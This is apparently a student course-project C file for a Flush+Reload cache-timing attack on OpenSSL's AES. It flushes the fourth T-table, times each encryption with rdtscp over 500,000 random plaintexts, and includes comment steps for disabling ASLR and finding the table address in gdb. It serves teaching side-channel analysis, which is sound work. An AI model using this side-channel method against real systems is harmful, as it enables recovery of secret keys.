/*Flush and Reload Attack Template Project 4
Name Surname: Mehmet Sinan INCI
Submission Date:
*/

#include <stdlib.h>
#include <sys/types.h>
#include <stdio.h>
#include <openssl/aes.h>
#include <assert.h>
#include "math.h"

//Use these definitions for the specific types
typedef unsigned char     uint8_t;
typedef unsigned short    uint16_t;
typedef unsigned int      uint32_t;
typedef unsigned long int uint64_t;

unsigned char plaintext[16];
unsigned char ciphertext[16];
unsigned char key[16]={0};
unsigned long time1,time2, exec_time;

uint64_t address_aesencrypt=0x400e40;	
uint64_t address_ttable=0x4040c0; // address of the t table 4
//uint64_t *p = 0x00007ffff7bb6960; // get the address of the t table 4 using gdb
	
//Flush Function: Flushes the address "p"
inline void clflush(volatile void * p){
	asm volatile ("clflush (%0)" :: "r"(p));
}

//Time stamp function: Takes the clock cycle of the processor
__inline__ void rdtsc(void *m) {
	__asm__ __volatile__ ("rdtscp" : "=a" (*((uint32_t *)(m))), "=d" (*((uint32_t *)(m+4))));
}

void main(void){

	//printf("point\n");
	/*Find the location of the forth T-table:
	In the terminal disable ASLR: 
	-echo 0| sudo tee /proc/sys/kernel/randomize_va_space
	Find the location:
	-gdb fnr_template
	-break AES_encrypt
	-run 127.0.0.1
	-p &Te4
	*/

	//Create the key for AES-128

	AES_KEY expanded;
	AES_set_encrypt_key(key, 128,&expanded);
	

	int i,j;
	int value, ik;
	//printf("point\n");
		
	//For 500000 times take the measurement and repeat it 10 times. Totally, you should have 5000000 traces.
	
	srand(time(NULL));

	for(i=0;i<500000;i++){

		

		//Create random 16 byte plaintext
		
		for (ik=0;ik<16;ik++){
			plaintext[ik] = rand() % 256;
			printf("%d\t",plaintext[ik]);
		}
		//printf("Plaintext Is %llu\n", plaintext);

		
		//Flush the 4th T-table
		

		//clflush(&AES_encrypt);
		/*if (i>=10){
			clflush(address_ttable);
			clflush(address_ttable+8);
			clflush(address_ttable+16);
			clflush(address_ttable+24);
			clflush(address_ttable+32);
			clflush(address_ttable+40);
			clflush(address_ttable+48);
			clflush(address_ttable+56);
		}
		*/


		for (j=0;j<256;j++){		// flushing the t table 4
		clflush(address_ttable+j);
		}
	
		//clflush(&Te4+8);
		//clflush(&Te4+16);
		//clflush(&Te4+24);
		//clflush(&Te4+32);
		//clflush(&Te4+40);
		//clflush(&Te4+48);
		//clflush(&Te4+56);
		
		
		//Measure the timing for the AES encryption function(before and after the encryption you should use the rdtsc function to get clock cycle of the processor. The difference is the timing for encryption.)
		
		rdtsc(&time1);
		AES_encrypt(plaintext,ciphertext,&expanded);
		rdtsc(&time2);
		exec_time = time2-time1;

		//printf("AES encryption took %lu cycles \n", exec_time);
		printf("%lu\n", exec_time);
		
		//Output the ciphertext and the corresponding times to .txt file

		
	}
}
